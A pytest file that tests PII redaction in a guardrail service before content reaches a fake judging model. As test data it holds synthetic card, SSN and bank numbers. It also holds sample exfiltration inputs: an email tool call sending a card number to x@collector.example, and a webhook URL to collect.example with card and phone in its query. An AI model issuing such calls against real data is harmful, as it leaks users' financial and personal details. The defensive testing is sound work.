"""M1-14: PII redaction in the Guard Service, checked against what the fake model receives.

AC-G2: no raw PII of a configured kind appears in a ``decide`` input. Redaction runs after
the raw size bound and before rendering; ``content_sha256`` still hashes the pre-redaction
content; the audit record, the verdict and the span carry counts per kind only; a detector
failure sends nothing. All values are synthetic (see ``test_guard_pii``).
"""

from __future__ import annotations

import hashlib
import json
import logging

import pytest
from guard_fixtures import ALPHA, Env, bundle, profile, rule

import guardrail_engine.guard.service as service_module
from guardrail_engine.guard import (
    DEFAULT_PII_DETECTOR,
    AuditRecord,
    Decision,
    PiiKind,
    PiiMatch,
    Plan,
    Reason,
    RedactionStatus,
    ToolCall,
    ToolInfo,
    ToolResult,
    Turn,
    replay,
)
from guardrail_engine.guard.redaction import REDACT_OFF_LOOP_CHARS
from guardrail_engine.policy import GUARD_POINTS

EMAIL = "jo.smith@example.com"
CARD = "4111 1111 1111 1111"
PHONE = "+1 201-555-0123"
SSN = "078-05-1120"
NINO = "QQ 12 34 56 C"
IBAN = "GB82 WEST 1234 5698 7654 32"
SORT, ACCOUNT = "12-34-56", "12345678"
RAW_VALUES = [EMAIL, "jo.smith@", CARD, PHONE, SSN, NINO, IBAN, SORT, ACCOUNT, "ops.lead@"]

TOOLS = (
    ToolInfo("claims.status", "Looks up a claim. Escalations go to ops.lead@example.org."),
    ToolInfo("email.send", "Sends an email."),
)


def pii_env(**kwargs) -> Env:
    return Env(tenants=[profile(ALPHA, tools=TOOLS)], **kwargs)


def conversation():
    return (
        Turn("user", f"My card is {CARD} and my phone is {PHONE}."),
        Plan(f'{{"steps": [{{"tool": "claims.status", "args": {{"ssn": "{SSN}"}}}}]}}'),
        ToolCall("claims.status", f'{{"nino": "{NINO}"}}'),
        ToolResult("claims.status", f"Pay to {IBAN}, or sort code {SORT} account {ACCOUNT}."),
        ToolCall("x@collector.example", '{"to": "x@collector.example"}'),  # unregistered name
    )


# ------------------------------------------------------------------ AC-G2


async def test_ac_g2_no_raw_pii_of_any_kind_reaches_the_model():
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(
            ALPHA, content=f"Contact {EMAIL} please.", conversation=conversation()
        )
    assert verdict.decision is Decision.ALLOW
    [call] = env.fake.calls
    for value in RAW_VALUES:
        assert value not in call.input, value
    for placeholder in ("[EMAIL]@example.com", "[CARD]", "[PHONE]", "[SSN]", "[NINO]", "[IBAN]"):
        assert placeholder in call.input
    assert "[SORT_CODE]" in call.input and "[ACCOUNT_NUMBER]" in call.input
    assert "[EMAIL]@example.org" in call.input  # the tool description, in tool_metadata
    assert "[EMAIL]@collector.example" in call.input  # the unregistered tool's name section


async def test_exfil_destination_domain_survives_and_a_card_never_appears():
    """The decision's own test: an exfil call to x@collector.example still shows
    @collector.example in the decide input; a card number never appears."""
    args = f'{{"to": "x@collector.example", "body": "card {CARD.replace(" ", "")}"}}'
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv", gps=GUARD_POINTS)]))
        await env.check(ALPHA, "tool_call", content=args)
    sent = env.fake.calls[0].input
    assert "@collector.example" in sent and "x@collector.example" not in sent
    assert CARD.replace(" ", "") not in sent and "[CARD]" in sent


async def test_a_card_and_a_phone_in_a_url_query_are_redacted_and_the_host_kept():
    """AC-G2 decision (backlog 0105b0a): a URL's path, query and fragment go through every
    detector; its scheme and authority reach the model byte for byte."""
    url = "https://collect.example:8443/hook?card=4111111111111111&tel=201-555-0123"
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv", gps=GUARD_POINTS)]))
        await env.check(ALPHA, "tool_call", content=f'{{"url": "{url}"}}')
    sent = env.fake.calls[0].input
    assert "https://collect.example:8443/hook?card=[CARD]&tel=[PHONE]" in sent
    assert "4111111111111111" not in sent and "201-555-0123" not in sent


@pytest.mark.parametrize("guard_point", GUARD_POINTS)
async def test_every_guard_point_redacts(guard_point):
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv", gps=GUARD_POINTS)]))
        await env.check(ALPHA, guard_point, content=f"ssn {SSN}")
    assert SSN not in env.fake.calls[0].input


# ------------------------------------------------------------------ what is and isn't redacted


class RecordingDetector:
    """Finds nothing; records every text it was asked about."""

    def __init__(self):
        self.texts: list[str] = []

    def find(self, text):
        self.texts.append(text)
        return ()


class WholeTextDetector:
    """Marks every text it sees as a card, from start to end."""

    def find(self, text):
        return (PiiMatch(PiiKind.CARD, 0, len(text)),) if text else ()


async def test_exactly_the_untrusted_texts_go_through_the_detector():
    detector = RecordingDetector()
    async with pii_env(pii_detector=detector) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        await env.check(ALPHA, content="the content", conversation=conversation())
    convo = conversation()
    assert sorted(detector.texts) == sorted(
        [
            "the content",
            convo[0].text,
            convo[1].text,
            convo[2].arguments,
            convo[3].result,
            convo[4].arguments,
            "x@collector.example",  # the unregistered tool's name
            TOOLS[0].description,  # the referenced registered tool's description
        ]
    )


async def test_trusted_header_registered_tool_names_and_questions_are_never_redacted():
    async with pii_env(pii_detector=WholeTextDetector()) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        await env.check(
            ALPHA, content="the content", conversation=(ToolCall("claims.status", "a"),)
        )
    [call] = env.fake.calls
    lines = call.input.splitlines()
    assert lines[:3] == [
        "TENANT DOMAIN: insurance",
        "TENANT: alpha (t_alpha)",
        "GUARD POINT: output",
    ]
    assert "TOOL tool_call_1: claims.status" in lines
    assert "the content" not in call.input and "[CARD]" in call.input
    assert "claims.status: [CARD]" in call.input  # name kept, description redacted
    assert call.questions["t__adv"].instructions == "Does the content match tenant rule adv?"


async def test_the_nonce_is_drawn_against_the_redacted_text():
    """Redaction is before rendering, so the renderer checks its nonce against the text it
    actually sends. A nonce that occurs only in the raw content is usable."""
    nonce = "0123456789abcdef0123456789abcdef"
    async with pii_env(nonce_source=lambda: nonce) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content=f"{nonce}@example.com")
    assert verdict.decision is Decision.ALLOW
    assert "[EMAIL]@example.com" in env.fake.calls[0].input


# ------------------------------------------------------------------ content_sha256, records, span


async def test_content_sha256_hashes_the_pre_redaction_content_and_is_never_sent():
    content = f"Write to {EMAIL}."
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content=content)
    digest = hashlib.sha256(content.encode()).hexdigest()
    assert verdict.content_sha256 == "sha256:" + digest
    assert digest not in env.fake.calls[0].input
    redacted = "Write to [EMAIL]@example.com."
    assert hashlib.sha256(redacted.encode()).hexdigest() not in (verdict.content_sha256 or "")


async def test_verdict_and_audit_record_carry_counts_per_kind_and_no_values():
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content=f"{EMAIL} {CARD}", conversation=conversation())
    expected = {
        PiiKind.EMAIL: 4,  # content, tool description, unregistered tool name, its arguments
        PiiKind.CARD: 2,
        PiiKind.PHONE: 1,
        PiiKind.US_SSN: 1,
        PiiKind.UK_NINO: 1,
        PiiKind.IBAN: 1,
        PiiKind.UK_SORT_CODE: 1,
        PiiKind.UK_ACCOUNT_NUMBER: 1,
    }
    assert verdict.redaction is RedactionStatus.APPLIED and verdict.pii_redacted == expected
    [record] = env.audit.records
    assert record.redaction is RedactionStatus.APPLIED and record.pii_redacted == expected
    dumped = record.model_dump_json()
    assert json.loads(dumped)["pii_redacted"] == {k.value: v for k, v in expected.items()}
    for value in RAW_VALUES:
        assert value not in dumped and value not in verdict.model_dump_json()


async def test_nothing_found_is_recorded_as_applied_with_no_counts():
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content="Nothing personal.")
    assert verdict.redaction is RedactionStatus.APPLIED and verdict.pii_redacted == {}


class _Trace:
    def __init__(self, sink):
        self.sink = sink

    def model_call_started(self):
        pass

    def model_call_ended(self, attributes):
        pass

    def end(self, attributes, *, error=False):
        self.sink.append(dict(attributes))


class RecordingTelemetry:
    def __init__(self):
        self.ended: list[dict] = []

    def start_check(self):
        return _Trace(self.ended)


async def test_span_carries_the_status_and_counts_per_kind_only():
    telemetry = RecordingTelemetry()
    async with pii_env(telemetry=telemetry) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        await env.check(ALPHA, content=f"{EMAIL} {CARD} {CARD}")
    [attrs] = telemetry.ended
    assert attrs["guardrail.redaction"] == "applied"
    assert attrs["guardrail.pii_redacted.email"] == 1
    assert attrs["guardrail.pii_redacted.card"] == 2
    assert "guardrail.pii_redacted.phone" not in attrs
    for value in attrs.values():
        assert not any(raw in str(value) for raw in RAW_VALUES)


# ------------------------------------------------------------------ failure: nothing is sent


class RaisingDetector:
    def find(self, text):
        raise ValueError(f"detector broke on {text}")


class OverlappingDetector:
    def find(self, text):
        return (PiiMatch(PiiKind.CARD, 0, 3), PiiMatch(PiiKind.PHONE, 1, 4)) if text else ()


@pytest.mark.parametrize("detector", [RaisingDetector(), OverlappingDetector()])
async def test_a_redaction_failure_fails_closed_and_sends_nothing(detector, caplog):
    sentinel = "SENTINEL-CONTENT-do-not-log"
    caplog.set_level(logging.DEBUG)
    async with pii_env(pii_detector=detector) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content=sentinel)
    assert (verdict.decision, verdict.reason) == (Decision.BLOCK, Reason.INTERNAL_ERROR)
    assert verdict.redaction is RedactionStatus.FAILED and verdict.pii_redacted == {}
    assert env.fake.calls == [] and verdict.provider_calls == 0
    [record] = env.audit.records
    assert record.redaction is RedactionStatus.FAILED
    assert sentinel not in record.model_dump_json() and sentinel not in (verdict.detail or "")
    assert sentinel not in caplog.text


# ------------------------------------------------------------------ order with sizes and tokens

CAP = 50


def capped(cap: int = CAP):
    gps = {gp: {"max_input_tokens": cap} for gp in GUARD_POINTS if gp != "tool_result"}
    gps["tool_result"] = {"chunk_tokens": cap, "max_input_tokens": 10_000}
    return bundle(ALPHA, rules=[rule("adv", gps=GUARD_POINTS)], guard_points=gps)


async def test_the_size_bound_is_checked_on_raw_content_before_any_redaction():
    detector = RecordingDetector()
    async with pii_env(pii_detector=detector) as env:
        await env.publish(capped())
        verdict = await env.check(ALPHA, content="x" * (4 * CAP + 1))
    assert verdict.reason is Reason.CONTENT_TOO_LARGE and verdict.redaction is None
    assert detector.texts == [] and env.fake.calls == []


async def test_content_that_grows_past_the_cap_when_redacted_is_blocked_unsent():
    content = ("a@x.example " * 20)[: 4 * CAP]  # at the cap raw; [EMAIL] outgrows "a"
    async with pii_env() as env:
        await env.publish(capped())
        verdict = await env.check(ALPHA, content=content)
    assert verdict.content_tokens == CAP
    assert (verdict.decision, verdict.reason) == (Decision.BLOCK, Reason.CONTENT_TOO_LARGE)
    assert "after redaction" in (verdict.detail or "") and env.fake.calls == []


async def test_context_budget_is_sized_on_the_redacted_content():
    """Raw, the content fills the cap and would leave no room for context; redacted (cards
    shrink to [CARD]) it leaves room, and the context item is kept."""
    cap = 2 * CAP  # room, once the cards shrink, for a context item's section markers
    content = ("4111111111111111 " * 24)[: 4 * cap]
    async with pii_env() as env:
        await env.publish(capped(cap))
        verdict = await env.check(ALPHA, content=content, conversation=(Turn("user", "hi"),))
    assert verdict.content_tokens == cap
    assert verdict.decision is Decision.ALLOW and verdict.context_items_dropped == 0
    assert "hi" in env.fake.calls[0].input


# ------------------------------------------------------------------ off the event loop


@pytest.mark.parametrize(
    ("content", "context", "threaded"),
    [
        ("x" * 100, (), False),
        ("x" * REDACT_OFF_LOOP_CHARS, (), False),  # at the threshold: inline
        ("x" * (REDACT_OFF_LOOP_CHARS + 1), (), True),
        ("x" * 100, (Turn("user", "y" * REDACT_OFF_LOOP_CHARS),), True),  # context counts
    ],
)
async def test_a_large_request_is_redacted_in_a_worker_thread(
    monkeypatch, content, context, threaded
):
    calls = []
    real = service_module.asyncio.to_thread

    async def spy(fn, *args, **kwargs):
        calls.append(fn)
        return await real(fn, *args, **kwargs)

    monkeypatch.setattr(service_module.asyncio, "to_thread", spy)
    text = content[: -(len(CARD) + 1)] + " " + CARD  # same length, with a card at the end
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))  # 8,000-token cap
        verdict = await env.check(ALPHA, content=text, conversation=context)
    assert verdict.decision is Decision.ALLOW
    assert verdict.pii_redacted == {PiiKind.CARD: 1} and CARD not in env.fake.calls[0].input
    assert len(calls) == (1 if threaded else 0)


async def test_a_detector_failure_in_the_worker_thread_still_fails_closed():
    async with pii_env(pii_detector=RaisingDetector()) as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        verdict = await env.check(ALPHA, content="x" * (REDACT_OFF_LOOP_CHARS + 1))
    assert (verdict.reason, verdict.redaction) == (Reason.INTERNAL_ERROR, RedactionStatus.FAILED)
    assert env.fake.calls == []


# ------------------------------------------------------------------ the detector and replay


async def test_the_default_detector_is_the_shared_deterministic_one():
    async with pii_env() as env:
        assert env.service._pii_detector is DEFAULT_PII_DETECTOR


async def test_replay_is_unaffected_and_records_without_the_new_fields_still_load():
    async with pii_env() as env:
        await env.publish(bundle(ALPHA, rules=[rule("adv")]))
        env.fake.set_noul("t__adv", 0.9)
        await env.check(ALPHA, content=f"card {CARD}")
    [record] = env.audit.records
    assert record.pii_redacted == {PiiKind.CARD: 1}
    replayed = replay(record)
    assert (replayed.decision, replayed.reason) == (record.decision, record.reason)
    older = json.loads(record.model_dump_json())
    del older["redaction"], older["pii_redacted"]
    reloaded = AuditRecord.model_validate(older)
    assert reloaded.redaction is None and reloaded.pii_redacted == {}
    assert replay(reloaded).decision is record.decision
